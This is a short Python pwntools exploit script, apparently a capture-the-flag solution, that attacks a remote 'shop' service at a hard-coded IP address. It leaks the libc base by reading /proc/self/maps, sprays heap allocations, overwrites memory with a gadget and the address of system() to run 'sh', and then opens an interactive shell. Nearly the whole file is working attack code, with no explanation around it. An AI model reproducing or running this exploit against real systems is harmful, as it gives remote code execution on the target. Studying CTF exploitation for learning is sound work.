from pwn import *
import re
import base64

#sh = process('./shop.rb')
sh = remote('52.3.190.202', 1337)

def add_skeleton(p):
    sh.recvuntil('uit')
    sh.sendline('m')
    sh.sendline(base64.b64encode(p))

def add_meme():
    sh.recvuntil('uit')
    sh.sendline('n')

def leak_libc():
    sh.recvuntil('uit')
    sh.sendline('p')
    sh.sendline('L3Byb2Mvc2VsZi9tYXBz')
    ll = sh.recvuntil('confirmation')
    for line in ll.split('\n'):
        if 'libc-' in line:
            return int(re.search(r'([0-9a-f]*)[^0-9a-f]', line).group(1), 16)

print "leak libc address ..."
libc_addr = leak_libc()
print "libc @ " + hex(libc_addr)

print "prepare exploit ..."
add_meme()
for i in range(255):
    print str(i)
    add_skeleton("A"*128)

system = libc_addr + 0x46640
gadget = libc_addr + 0x6e0cf                # mov rdi, rax ; call qword ptr [rax+0x20]

d = " sh ####"
d += p64(gadget)
d += "X"*8
d += "X"*8
d += p64(system)
add_skeleton(d)


print "trigger exploit ..."
sh.sendline('c')

sh.interactive()
